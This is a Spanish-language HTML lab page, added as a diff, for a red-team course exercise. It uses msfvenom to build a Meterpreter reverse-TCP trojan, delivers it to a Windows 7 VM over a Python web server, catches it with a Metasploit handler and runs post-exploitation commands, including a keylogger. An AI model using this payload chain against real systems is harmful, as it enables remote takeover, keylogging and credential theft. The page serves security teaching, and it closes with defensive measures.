@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Laboratorio Red Team | CRD</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="assets/css/estilos.css">
+</head>
+<body>
+<main>
+
+  <div data-include="aviso-etico"></div>
+
+  <main>
+
+
+  <h1>Laboratorio Red Team: Pruebas de Explotación de vulnerabilidades en Entornos Aislados utilizando Metasploit, Kali Linux</h1>
+
+  <hr>
+
+  <h2>📝 1. Objetivo General</h2>
+  <p>
+    Ejecutar una práctica real de hacking ético en un laboratorio controlado, mediante la explotación de vulnerabilidades en un sistema operativo Windows 7 desde Kali Linux, utilizando Metasploit para obtener acceso remoto, realizar acciones de post-explotación y analizar vectores de ataque sobre sistemas operativos reales desplegados en máquinas virtuales.
+  </p>
+
+  <hr>
+
+  <h2>🎯 2. Objetivos Específicos</h2>
+  <ul>
+    <li>Configurar un laboratorio con sistemas operativos reales virtualizados.</li>
+    <li>Realizar un ataque real desde Kali Linux hacia Windows 7.</li>
+    <li>Obtener una sesión Meterpreter real mediante un payload ejecutado en el sistema víctima.</li>
+    <li>Ejecutar técnicas de post-explotación como elevación de privilegios, keylogging, extracción de credenciales, entre otros.</li>
+    <li>Documentar todo el proceso con enfoque técnico y ético.</li>
+  </ul>
+
+  <hr>
+
+  <h2>🧰 3. Herramientas Utilizadas</h2>
+
+  <table border="1" cellpadding="6" style="border-collapse:collapse;">
+    <thead>
+      <tr>
+        <th>Herramienta</th>
+        <th>Descripción</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Kali Linux (x64)</strong></td>
+        <td>Sistema atacante con herramientas ofensivas</td>
+      </tr>
+      <tr>
+        <td><strong>Windows 7 SP1 (x86 o x64)</strong></td>
+        <td>Sistema víctima vulnerable</td>
+      </tr>
+      <tr>
+        <td><strong>Metasploit Framework</strong></td>
+        <td>Plataforma de explotación y post-explotación</td>
+      </tr>
+      <tr>
+        <td><strong>msfvenom</strong></td>
+        <td>Generación de payloads personalizados</td>
+      </tr>
+      <tr>
+        <td><strong>VMware</strong></td>
+        <td>Entorno de virtualización, sistemas operativos reales</td>
+      </tr>
+      <tr>
+        <td><strong>Wireshark (opcional)</strong></td>
+        <td>Análisis de tráfico de red</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>🧱 4. Arquitectura del Laboratorio Real</h2>
+  <figure>
+      <img src="assets/img/Metasploit.png" alt="Topología de Red" style="width:50%; border-radius: 8px; margin: 20px 0;">
+      <figcaption><strong>Figura 1:</strong> Arquitectura de red</figcaption>
+    </figure>
+  <p>🔹 Ambos sistemas están virtualizados, pero operan como sistemas completos y funcionales, conectados por una red interna <code>VMnet1</code></p>
+
+  <hr>
+
+  <h2>⚙️ 5. Desarrollo del Ataque Real</h2>
+
+  <h3>🔸 5.1. Conexión inicial</h3>
+  <ul>
+    <li>En el <strong>Virtual Network Editor</strong> habilitar el DHCP en la <code>VMnet1</code></li>
+    <li>Conectar el Kali y el Windows 7 a la <code>VMnet1</code></li>
+    <li>Verificar que Kali y Windows 7 recibieron dirección IP (<code>ifconfig</code> e <code>ipconfig</code> respectivamente) y probar conectividad (<code>ping</code>) entre ambas.</li>
+  </ul>
+
+  <h3>🔸 5.2. Generación del payload (Kali)</h3>
+  <p><strong>Propósito:</strong> Generar un archivo ejecutable que establecerá una conexión inversa desde la máquina de prueba a Kali Linux.</p>
+  <p><strong>Acciones:</strong></p>
+  <ol>
+    <li>Crea una carpeta y dentro de esta abre una terminal en Kali Linux.</li>
+    <li>Ejecuta el comando:</li>
+  </ol>
+
+  <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP_KALI ojo reemplazar&gt; LPORT=4444 -f exe -o MiTrojan.exe</code></pre>
+
+  <ul>
+    <li><code>msfvenom</code>: Herramienta de Metasploit para crear payloads.</li>
+    <li><code>-p windows/meterpreter/reverse_tcp</code>: Especifica el payload a usar, en este caso Meterpreter con una conexión inversa TCP para Windows.</li>
+    <li><code>LHOST=&lt;IP_KALI ojo reemplazar&gt;</code>: Dirección IP de Kali Linux.</li>
+    <li><code>LPORT=4444</code>: Puerto a utilizar para la conexión inversa.</li>
+    <li><code>-f exe</code>: Formato del payload, en este caso un archivo ejecutable.</li>
+    <li><code>-o MiTrojan.exe</code>: Nombre del archivo generado.</li>
+  </ul>
+
+  <h3>🔸 5.4. Transferir el ejecutable</h3>
+  <p>En Kali, en el mismo directorio donde está <code>MiTrojan.exe</code> ejecutar:</p>
+
+  <pre><code>python3 -m http.server 80</code></pre>
+
+  <p>Esto crea un servidor web básico para transferir el archivo.</p>
+  <p>En Windows 7 abrir el navegador web y entrar a la dirección del Kali (ejemplo <code>http://192.168.80.128</code>) y descargar <code>MiTrojan.exe</code> y ejecutar.</p>
+
+  <h3>🔸 5.4. Configuración del listener</h3>
+  <p><strong>Propósito:</strong> Preparar Metasploit para escuchar y gestionar las conexiones entrantes desde el payload.</p>
+  <p><strong>Acciones:</strong></p>
+  <ol>
+    <li>Inicia Metasploit Framework ejecutando:</li>
+  </ol>
+
+  <pre><code>msfconsole</code></pre>
+
+  <p>Configura el exploit para escuchar las conexiones entrantes:</p>
+
+  <pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST &lt;IP_KALI OJO reemplazar&gt;
+set LPORT 4444
+exploit</code></pre>
+
+  <ul>
+    <li><code>use exploit/multi/handler</code>: Utiliza el módulo handler para manejar la sesión.</li>
+    <li><code>set payload windows/meterpreter/reverse_tcp</code>: Configura el payload que usará el handler.</li>
+    <li><code>set LHOST &lt;IP_KALI&gt;</code>: Establece la dirección IP de Kali Linux.</li>
+    <li><code>set LPORT 4444</code>: Establece el puerto para la conexión inversa.</li>
+    <li><code>exploit</code>: Inicia el handler para escuchar conexiones.</li>
+  </ul>
+
+  <h3>🔸 5.4. Ejecución del payload en Windows 7</h3>
+  <p>El archivo <code>backdoor.exe</code> se ejecuta manualmente o mediante ingeniería social.</p>
+  <p>Se obtiene una sesión real de Meterpreter.</p>
+
+  <h3>🔸 5.5. Post-explotación (comandos ejecutados)</h3>
+  <p>Ejemplo de uso en Meterpreter:</p>
+
+  <pre><code>meterpreter &gt; ?   &lt;esto muestra todos los commandos&gt;
+sysinfo    &lt;Muestra info del sistema operativo, arquitectura, etc.&gt;
+ps         &lt;Lista procesos en ejecución (ideal para migración)&gt;
+shell      &lt;Abre una shell del sistema víctima&gt;
+keyscan_start / keyscan_dump   &lt;Inicia/dumpea el keylogger&gt;</code></pre>
+
+  <hr>
+
+  <h2>✅ 6. Resultados del Ataque</h2>
+  <ul>
+    <li>Se obtuvo acceso completo a Windows 7 con una sesión Meterpreter estable.</li>
+    <li>Se capturó la pantalla, se inició un keylogger y se extrajeron hashes del SAM.</li>
+    <li>Se logró persistencia mediante la ejecución automática del payload al inicio del sistema.</li>
+  </ul>
+
+  <hr>
+
+  <h2>⚠️ 7. Riesgos Identificados</h2>
+  <ul>
+    <li>Windows 7 sin parches es vulnerable a múltiples vectores de ataque (MS08-067, EternalBlue, etc.).</li>
+    <li>La ausencia de antivirus y firewall permitió la ejecución del payload sin detección.</li>
+    <li>Los sistemas operativos antiguos representan una amenaza grave si están en entornos productivos.</li>
+  </ul>
+
+  <hr>
+
+  <h2>🧠 8. Análisis de Seguridad</h2>
+  <p>Esta práctica demuestra cómo los atacantes pueden explotar fallos reales.</p>
+  <p>La explotación se realizó de forma 100% funcional, no simulada, sobre entornos virtualizados que representan sistemas reales.</p>
+  <p>Reforzar medidas como parcheo, antivirus, y políticas de ejecución es fundamental para evitar este tipo de ataques.</p>
+
+  <hr>
+
+  <h2>📚 9. Conclusión</h2>
+  <p>
+    El laboratorio permitió realizar un ataque real controlado desde una máquina Kali Linux hacia un sistema Windows 7, demostrando la efectividad del framework Metasploit como plataforma de explotación y post-explotación.
+  </p>
+
+  <p>
+    Se empleó un payload de tipo <strong>reverse TCP</strong>, una técnica en la que, tras la ejecución del archivo malicioso, es la máquina víctima quien inicia la conexión hacia el atacante, estableciendo un canal de comunicación inversa. Esta arquitectura es particularmente efectiva porque evade muchos firewalls, routers y soluciones de seguridad perimetrales, que suelen bloquear conexiones entrantes, pero permiten conexiones salientes desde el sistema.
+  </p>
+
+  <p>
+    Al ser la víctima quien "abre la puerta" al atacante, el payload logra establecer una sesión remota estable (Meterpreter) sin levantar sospechas inmediatas en sistemas de detección básicos. Esta característica hace que reverse TCP sea ideal para pruebas de intrusión realistas en entornos internos o desprotegidos.
+  </p>
+
+  <p>
+    La práctica refuerza el aprendizaje técnico de herramientas ofensivas reales, y evidencia la necesidad crítica de implementar controles de seguridad en los sistemas operativos vulnerables, incluyendo:
+  </p>
+
+  <ul>
+    <li>Actualizaciones de seguridad y parches del sistema.</li>
+    <li>Uso de soluciones EDR/antivirus modernos con análisis de comportamiento.</li>
+    <li>Políticas de restricción de ejecución (como AppLocker o SRP).</li>
+    <li>Firewalls que filtren también conexiones salientes no autorizadas.</li>
+  </ul>
+
+  <p>
+    Este laboratorio demuestra de forma práctica y real cómo un atacante puede tomar el control total de un sistema desactualizado mediante técnicas modernas, y remarca la importancia de una estrategia defensiva integral.
+  </p>
+
+  <hr>
+
+  <h2>📘 10. Referencias</h2>
+  <ul>
+    <li><a href="https://docs.rapid7.com/metasploit" target="_blank" rel="noopener">https://docs.rapid7.com/metasploit</a></li>
+    <li><a href="https://www.kali.org/tools/metasploit-framework" target="_blank" rel="noopener">https://www.kali.org/tools/metasploit-framework</a></li>
+    <li><a href="https://attack.mitre.org" target="_blank" rel="noopener">https://attack.mitre.org</a></li>
+  </ul>
+
+  <hr>
+
+  <!-- Mantengo el iframe y el formulario tal como indicaba tu plantilla original -->
+  <section>
+    <h2>Ejercicios</h2>
+    <div class="iframe-wrapper">
+      <iframe src="https://app.lumi.education/api/v1/run/CWU-55/embed" width="1088" height="400" frameborder="0" allowfullscreen="allowfullscreen" allow="geolocation *; microphone *; camera *; midi *; encrypted-media *"></iframe>
+      <script src="https://app.Lumi.education/api/v1/h5p/core/js/h5p-resizer.js" charset="UTF-8"></script>
+    </div>
+  </section>
+
+  <form id="form-reportar" class="form-horizontal" >
+    <input type="hidden" id="titulo" name="titulo">
+    <input type="hidden" id="archivo" name="archivo">
+    <input type="hidden" id="fecha" name="fecha">
+    <textarea id="comentario" name="comentario" placeholder="Escribí tu comentario aquí" required></textarea>
+    <button type="submit">Enviar</button>
+  </form>
+
+</main>
+
+
+
+<form id="form-reportar" class="form-horizontal" >
+  <input type="hidden" id="titulo" name="titulo">
+  <input type="hidden" id="archivo" name="archivo">
+  <input type="hidden" id="fecha" name="fecha">
+  <textarea id="comentario" name="comentario" placeholder="Escribí tu comentario aquí" required></textarea>
+  <button type="submit">Enviar</button>
+</form>
+
+</main>
+<div data-include="footer"></div>
+<script src="assets/js/scripts.js"></script>
+</body>
+</html>
